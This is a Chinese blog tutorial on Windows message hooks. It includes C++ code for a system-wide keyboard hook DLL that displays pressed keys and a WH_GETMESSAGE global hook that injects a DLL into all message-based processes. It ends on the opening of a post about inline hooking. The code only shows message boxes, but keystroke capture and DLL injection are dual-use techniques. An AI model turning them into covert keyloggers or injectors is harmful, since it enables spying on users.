<p>​    安装全局钩子后，只要进程接收到可以发出钩子的消息后，全局钩子的DLL文件会被操作系统自动或强行的加载到该进程中。由此可见，设置消息钩子也是一种可以进行DLL注入的方法。</p>
<h1 id="钩子函数"><a href="#钩子函数" class="headerlink" title="钩子函数"></a>钩子函数</h1><p>钩子函数在系统消息触发时被系统调用 。在某个事件触发后，钩子函数捕获它并完成一些操作，是一段用以处理系统消息的程序</p>
<h1 id="相关API函数"><a href="#相关API函数" class="headerlink" title="相关API函数"></a>相关API函数</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LRESULT CALLBACK HookProc  <span class="comment">//所有的钩子函数都是这种形式</span></span><br><span class="line">(</span><br><span class="line">  <span class="keyword">int</span> nCode,</span><br><span class="line">  WPARAM wParam,</span><br><span class="line">  LPARAM lParam,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>



<p>参数nCode：钩子代码，钩子子程通过该代码来决定执行什么动作。该值取决于钩子的类型，每种类型都拥有自己特有的钩子代码集合。</p>
<p>参数wParam和<em>lParam</em>的值，都取决于钩子代码。但是一般都包含发送或者传递的消息的信息。</p>
<h2 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx"></a>SetWindowsHookEx</h2><p>返回一个钩子句柄</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HHOOK WINAPI <span class="title">SetWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  <span class="keyword">int</span> idHook,</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  HOOKPROC lpfn,<span class="comment">//回调函数，名称任意，参数和返回值数据固定</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  HINSTANCE hMod,<span class="comment">//为DllMain第一个参数g_Inst=(HMODULE)hModule;</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_  DWORD dwThreadId<span class="comment">//全局钩子设置0</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<p>lpfn：指定HOOK函数的地址。如果dwThread参数被设置为0或者被设置为一个进程中的线程ID，则该回调HOOK函数只能在DLL文件中。如果dwThread为当前进程中的线程ID，则这个回调函数可以在当前进程中也可以在DLL中。</p>
<p>hMod：钩子函数所在模块的句柄。lpfn所在的模块的句柄，如果dwThreadId为当前进程中的线程ID，而且lpfn所指向的函数在当前进程中，那么hMod被设置为NULL</p>
<p>dwThreadId：需要被挂钩的线程ID号（指定的话为局部钩子），如果设置为0表示在基于消息机制的所有的线程挂钩（全局钩子），如果指定为具体ID好，那么表示要在指定的线程中进行挂钩。这个参数影响上边两个参数的取值，决定了该钩子属于全局钩子还是局部钩子。</p>
<p>idHook:钩子的类型</p>
<p><img src="Windows%E9%92%A9%E5%AD%90%E5%87%BD%E6%95%B0.assets/20191231092715762.png" alt="img"></p>
<h2 id="UnhookWindowsEx"><a href="#UnhookWindowsEx" class="headerlink" title="UnhookWindowsEx"></a>UnhookWindowsEx</h2><p>移除先前用SetWindowsHookEx安装的钩子，</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">UnhookWindowsHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HHOOK hhk            <span class="comment">//钩子句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>可以多次反复安装钩子，而且可以安装多个同样类型的钩子。这样会形成一条钩子链，最后安装的钩子会首先截获到消息，当该钩子对消息处理完毕以后会选择返回，或者继续传递消息。通常情况下，为了消息可以传达到目标窗口，我们会选择将消息继续传递</p>
<h2 id="CallNextHookEx"><a href="#CallNextHookEx" class="headerlink" title="CallNextHookEx"></a>CallNextHookEx</h2><p>使消息继续传递，第一个参数为钩子句柄，后面三个为钩子函数的参数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LRESULT <span class="title">CallNextHookEx</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  HHOOK  hhk,</span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>    nCode,</span></span></span><br><span class="line"><span class="function"><span class="params">  WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">  LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h2 id="GetKeyNameText"><a href="#GetKeyNameText" class="headerlink" title="GetKeyNameText"></a>GetKeyNameText</h2><p>GetKeyNameText函数检索表示键的名称的字符串。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">GetKeyNameTextA</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  LONG  lParam,<span class="comment">//钩子函数的第三个参数lparam</span></span></span></span><br><span class="line"><span class="function"><span class="params">  LPSTR lpString,<span class="comment">//接收的缓冲区</span></span></span></span><br><span class="line"><span class="function"><span class="params">  <span class="keyword">int</span>   cchSize<span class="comment">//最大大小</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>



<h1 id="键盘钩子实例"><a href="#键盘钩子实例" class="headerlink" title="键盘钩子实例"></a>键盘钩子实例</h1><p>功能为用Messagebox显示按下键的字符。既然要截获键盘消息，那么肯定是截获系统范围内的键盘消息，因此需要安装全局钩子，这样就需要DLL文件支持。</p>
<p>首先新建DLL文件，定义两个导出函数和两个全局变量</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义导出函数，开始hook和结束hook</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">HHOOK g_Hook = <span class="literal">NULL</span>;</span><br><span class="line">HINSTANCE g_Inst = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重写钩子函数</span></span><br><span class="line"><span class="comment">//CallNextHookEx函数表示将当前钩子传递给钩子链中的下一个钩子</span></span><br><span class="line"><span class="comment">//第一个参数当前钩子的句柄。如果直接返回0，则表示中断钩子传递</span></span><br><span class="line"><span class="comment">//对钩子进行拦截</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> code,</span></span></span><br><span class="line"><span class="function"><span class="params">    WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//进入钩子函数的第一个判断，如果code&lt;0必须调用CallNextHookEx将消息继续传递下去，不对消息进行处理，并返回CallNextHookEx的返回值，MSDN要求。</span></span><br><span class="line">    <span class="keyword">if</span> (code &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> CallNextHookEx(g_Hook, code, wParam, lParam);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//如果code等于HC_ACTION，表示消息中含有按键消息，如果为WM_KEYDOWN显示按键对应文本</span></span><br><span class="line">    <span class="keyword">if</span> (code == HC_ACTION &amp;&amp; lParam &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        TCHAR szBuf[MAXBYTE] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        GetKeyNameText(lParam, szBuf, MAXBYTE);</span><br><span class="line">        MessageBox(<span class="literal">NULL</span>, szBuf, <span class="literal">NULL</span>, MB_OK);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_Hook, code, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_Inst, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UnhookWindowsHookEx(g_Hook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_Inst = (HMODULE)hModule;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>在DllMain函数中，需要保存该DLL模块的句柄，以方便安装全局钩子</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MFCKeyboardHookDlg.cpp: 实现文件</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MFCKeyboardHook.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;MFCKeyboardHookDlg.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;afxdialogex.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;KeyboardHook&quot;</span>)</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _DEBUG</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> new DEBUG_NEW</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CMFCKeyboardHookDlg 对话框</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CMFCKeyboardHookDlg::CMFCKeyboardHookDlg(CWnd* pParent <span class="comment">/*=nullptr*/</span>)</span><br><span class="line">	: CDialog(IDD_MFCKEYBOARDHOOK_DIALOG, pParent)</span><br><span class="line">&#123;</span><br><span class="line">	m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCKeyboardHookDlg::DoDataExchange</span><span class="params">(CDataExchange* pDX)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CDialog::DoDataExchange(pDX);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BEGIN_MESSAGE_MAP(CMFCKeyboardHookDlg, CDialog)</span><br><span class="line">	ON_WM_PAINT()</span><br><span class="line">	ON_WM_QUERYDRAGICON()</span><br><span class="line">	ON_BN_CLICKED(IDC_BUTTON2, &amp;CMFCKeyboardHookDlg::OnBnClickedButton2)</span><br><span class="line">	ON_BN_CLICKED(IDC_BUTTON1, &amp;CMFCKeyboardHookDlg::OnBnClickedButton1)</span><br><span class="line">END_MESSAGE_MAP()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// CMFCKeyboardHookDlg 消息处理程序</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CMFCKeyboardHookDlg::OnInitDialog</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	CDialog::OnInitDialog();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line">	<span class="comment">//  执行此操作</span></span><br><span class="line">	SetIcon(m_hIcon, TRUE);			<span class="comment">// 设置大图标</span></span><br><span class="line">	SetIcon(m_hIcon, FALSE);		<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;  <span class="comment">// 除非将焦点设置到控件，否则返回 TRUE</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果向对话框添加最小化按钮，则需要下面的代码</span></span><br><span class="line"><span class="comment">//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，</span></span><br><span class="line"><span class="comment">//  这将由框架自动完成。</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCKeyboardHookDlg::OnPaint</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (IsIconic())</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="function">CPaintDC <span class="title">dc</span><span class="params">(<span class="keyword">this</span>)</span></span>; <span class="comment">// 用于绘制的设备上下文</span></span><br><span class="line"></span><br><span class="line">		SendMessage(WM_ICONERASEBKGND, <span class="keyword">reinterpret_cast</span>&lt;WPARAM&gt;(dc.GetSafeHdc()), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 使图标在工作区矩形中居中</span></span><br><span class="line">		<span class="keyword">int</span> cxIcon = GetSystemMetrics(SM_CXICON);</span><br><span class="line">		<span class="keyword">int</span> cyIcon = GetSystemMetrics(SM_CYICON);</span><br><span class="line">		CRect rect;</span><br><span class="line">		GetClientRect(&amp;rect);</span><br><span class="line">		<span class="keyword">int</span> x = (rect.Width() - cxIcon + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">int</span> y = (rect.Height() - cyIcon + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// 绘制图标</span></span><br><span class="line">		dc.DrawIcon(x, y, m_hIcon);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		CDialog::OnPaint();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//当用户拖动最小化窗口时系统调用此函数取得光标</span></span><br><span class="line"><span class="comment">//显示。</span></span><br><span class="line"><span class="function">HCURSOR <span class="title">CMFCKeyboardHookDlg::OnQueryDragIcon</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">static_cast</span>&lt;HCURSOR&gt;(m_hIcon);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCKeyboardHookDlg::OnBnClickedButton2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">	SetHookOn();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMFCKeyboardHookDlg::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">	SetHookOff();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h1 id="全局钩子DLL注入"><a href="#全局钩子DLL注入" class="headerlink" title="全局钩子DLL注入"></a>全局钩子DLL注入</h1><p>WH_GETMESSAGE：该钩子作用是监视被投递到消息队列的消息。也就是在调用GetMessage()或PeekMessage()函数时，函数从消息队列中获取一个消息后调用该钩子。</p>
<p>利用WH_GETMESSAGE可以将DLL文件注入到所有的基于消息机制的程序中，在需要DLL大范围注入到基于消息的进程中时可以使用这种方法</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">&quot;mydata&quot;</span>)</span></span><br><span class="line">HHOOK g_Hook = <span class="literal">NULL</span>;    <span class="comment">//必须赋初值，否则微软编译器会把没有初始化的数据放到普通的未初始化数据段中</span></span><br><span class="line">                        <span class="comment">//而不是放在shared中,从而导致多个进程之间的共享行为失败</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/SECTION:mydata,RWS&quot;</span>)</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">HINSTANCE g_hInst;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">GetMessageProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">    <span class="keyword">int</span> nCode,</span></span></span><br><span class="line"><span class="function"><span class="params">    WPARAM wParam,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPARAM lParam</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    MessageBox(<span class="literal">NULL</span>, <span class="string">L&quot;Hooked&quot;</span>, <span class="string">L&quot;提示&quot;</span>, MB_ICONWARNING | MB_OKCANCEL);</span><br><span class="line">    <span class="keyword">return</span> CallNextHookEx(g_Hook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetHookOn</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    g_Hook=SetWindowsHookEx(WH_GETMESSAGE, GetMessageProc, g_hInst, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetHookOff</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    UnhookWindowsHookEx(g_Hook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    &#123;</span><br><span class="line">        g_hInst = hModule;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-02-03T06:19:25.000Z" title="2021-02-03T06:19:25.000Z">2021-02-03</time>发表</span><span class="level-item"><time dateTime="2021-02-03T06:21:28.605Z" title="2021-02-03T06:21:28.605Z">2021-02-03</time>更新</span><span class="level-item">11 分钟读完 (大约1646个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/02/03/Inline-Hook-%E5%86%85%E8%81%94%E9%92%A9%E5%AD%90/">Inline Hook(内联钩子)</a></h1><div class="content"><h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>API函数保存在操作系统的DLL文件中，在运行程序后程序会将API所在的DLL加载入进程中，当在程序中使用某个API函数时。这样程序就会像调用自己的函数一样调用API，大体过程如图1所示。</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/preview?id=601a3f4ece6d400001750f38"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-b1ebbd3c-ca49-405b-957b-effe60782276/8bdf51f1-8df9-416e-89f8-47845d1379aa.jpeg" alt="imgbed.cn图床"></a></p>
<p>图1 调用API函数的大体过程</p>
<p>从图1中可以看出，在进程中当EXE模块调用CreateFile()函数的时候，会去调用kernel32.dll模块中的CreateFile()函数，因为真正的CreateFile()函数的实现在kernel32.dll模块中。</p>
